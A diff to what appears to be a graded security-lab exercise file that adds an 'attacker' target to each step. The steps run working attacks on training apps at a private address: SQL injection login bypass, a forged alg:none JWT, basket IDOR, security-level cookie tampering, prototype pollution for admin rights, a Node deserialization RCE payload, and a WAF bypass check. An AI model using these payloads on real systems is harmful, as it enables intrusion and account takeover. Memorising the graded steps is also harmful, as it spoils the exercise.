@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: token
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"anything"}'''
   risk_level: low
 - order: 2
@@ -37,6 +38,7 @@ steps:
     type: output_contains
     expect: JWT Header
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"''
     -f4) && echo ''=== JWT Header ==='' && echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null && echo '''' && echo ''=== JWT Payload ==='' && echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null'
   risk_level: low
@@ -53,6 +55,7 @@ steps:
     type: output_contains
     expect: Forged JWT
     field: stdout
+  target_vm: attacker
   script: 'HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w0 | tr ''+/'' ''-_'' | tr -d ''='') && PAYLOAD=$(echo -n ''{"status":"success","data":{"id":2,"email":"user@juice-sh.op","role":"customer"}}''
     | base64 -w0 | tr ''+/'' ''-_'' | tr -d ''='') && FORGED="${HEADER}.${PAYLOAD}." && echo "Forged JWT: ${FORGED:0:60}..." && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $FORGED"
     -w ''\nHTTP:%{http_code}'''
@@ -68,6 +71,7 @@ steps:
     type: output_contains
     expect: Set-Cookie
     field: stdout
+  target_vm: attacker
   script: curl -s -c /tmp/dvwa_deser.txt -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L -D - | grep -i 'set-cookie' && echo '=== Cookie File ===' && cat /tmp/dvwa_deser.txt
   risk_level: low
 - order: 5
@@ -83,6 +87,7 @@ steps:
     type: output_contains
     expect: First name
     field: stdout
+  target_vm: attacker
   script: SESSID=$(grep PHPSESSID /tmp/dvwa_deser.txt | awk '{print $NF}') && echo '=== impossible 레벨 ===' && curl -s -b "PHPSESSID=$SESSID;security=impossible" 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit'
     -o /dev/null -w 'HTTP:%{http_code}' && echo '' && echo '=== low 레벨 (변조) ===' && curl -s -b "PHPSESSID=$SESSID;security=low" "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"
     | grep -o 'First name:[^<]*' | head -3
@@ -100,6 +105,7 @@ steps:
     type: output_contains
     expect: Basket
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"''
     -f4) && echo ''=== Basket 1 ==='' && curl -s http://10.20.30.80:3000/rest/basket/1 -H "Authorization: Bearer $TOKEN" | head -c 300 && echo '''' && echo ''=== Basket 2 ==='' && curl -s http://10.20.30.80:3000/rest/basket/2
     -H "Authorization: Bearer $TOKEN" | head -c 300'
@@ -117,6 +123,7 @@ steps:
     type: output_contains
     expect: email
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type: application/json'' -d ''{"email":"proto_test@test.com","password":"test1234","passwordRepeat":"test1234","__proto__":{"role":"admin","isAdmin":true}}''
     -w ''\nHTTP:%{http_code}'''
   risk_level: medium
@@ -133,6 +140,7 @@ steps:
     type: output_contains
     expect: Node.js Deserialization Payload
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/node_deser.json << 'JSONEOF'\n{\n  \"username\": \"attacker\",\n  \"rce\": \"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"\n}\nJSONEOF\necho\
     \ '=== Node.js Deserialization Payload ===' && cat /tmp/node_deser.json && echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type: application/json' -d @/tmp/node_deser.json\
     \ -w '\\nHTTP:%{http_code}'"
@@ -149,6 +157,7 @@ steps:
     type: output_contains
     expect: ===
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/api/Users/ -H ''Content-Type: application/json'' -d ''{"email":"waf@t.com","password":"t","__proto__":{"role":"admin"}}''
     && echo '''' && echo ''=== Direct (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type: application/json'' -d ''{"email":"nowaf@t.com","password":"t","__proto__":{"role":"admin"}}'''
   risk_level: low
